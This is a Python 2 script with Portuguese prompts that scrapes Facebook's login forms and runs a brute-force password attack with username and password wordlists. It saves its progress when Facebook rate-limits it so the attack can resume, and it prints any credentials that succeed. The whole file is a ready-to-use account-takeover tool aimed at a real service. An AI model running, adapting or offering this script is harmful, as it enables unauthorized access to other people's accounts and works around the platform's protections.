# -*- coding: utf-8 -*-
from bs4 import BeautifulSoup
import requests

site = "https://www.facebook.com" #1

requisicao = requests.Session() #2
resposta = requisicao.get(site).text
bs = BeautifulSoup(resposta, "lxml")

class Formulario: #3
    def __init__(self, url, corpo_POST):
        self.url = url #4
        self.corpo_POST = corpo_POST #5

formularios = [] #6
num = 0 #7

print "FORMULÁRIOS"
for formulario in bs.find_all("form") : #8
    if formulario["action"] == "": #9
        url = site #10
        print num, "-", url #11
    else: #12
        url = formulario["action"] #13
        print num, "-", url #14
    corpo_POST = {} #15

    for INPUT in formulario.find_all("input"): #16
        try:
            atributo_name = INPUT["name"] #17
        except:
            continue #18
        try:
            atributo_value = INPUT["value"] #19
        except:
            atributo_value = "" #20
        print "\t" + atributo_name + "=" + atributo_value #21
        corpo_POST[atributo_name] = atributo_value #22

    form = Formulario(url, corpo_POST) #23
    formularios.append(form) #24
    num += 1 #25

ID = input("\nDeseja realizar força bruta em qual formulário (Número)? ") #26
LOGIN = raw_input("Nome do campo para login: ") #27
PASSWORD = raw_input("Nome do campo para senha: ") #28
print "\nIniciando o ataque de força bruta"

with open("usuarios.txt") as USUARIOS:
    with open("senhas.txt") as SENHAS:
        usuarios = USUARIOS.readlines() #29
        senhas = SENHAS.readlines() #30

try: #31
    with open("ultimo_login.txt") as ultimo_login: #32
        ultimo_usuario = int(ultimo_login.readline().strip("\n"))
        ultima_senha = int(ultimo_login.readline().strip("\n"))
except: #33
    ultimo_usuario, ultima_senha = 0,0 #34
else: #35
    usuarios = usuarios[ultimo_usuario:] #36

for usuario in usuarios:
    usuario = usuario.strip("\n")
    formularios[ID].corpo_POST[LOGIN] = usuario #37

    for senha in senhas[ultima_senha:]: #38
        senha = senha.strip("\n")
        formularios[ID].corpo_POST[PASSWORD] = senha #39
        #Descomente a linha abaixo para saber qual é o usuário e senha
		#que o script está fazendo a força bruta
        #print "tentando ->", usuario, senha
        resultado = requisicao.post(formularios[ID].url, data=formularios[ID].corpo_POST) #40
        if "Tente novamente mais tarde" in resultado.text: #41
            print "\nFacebook bloqueou nossas tentativas. Saindo..."
            with open("ultimo_login.txt", "w") as ultimo_login: #42
                ultimo_login.write(str(ultimo_usuario))
                ultimo_login.write("\n")
                ultimo_login.write(str(ultima_senha))
            exit() #43
        else: #44
            ultima_senha += 1 #45

        if resultado.history: #46
        #if "A senha inserida está incorreta." not in resultado.text:
            print "\nUsuario:", usuario
            print "Senha:", senha
            break #47

    ultimo_usuario += 1 #48
    ultima_senha = 0 #49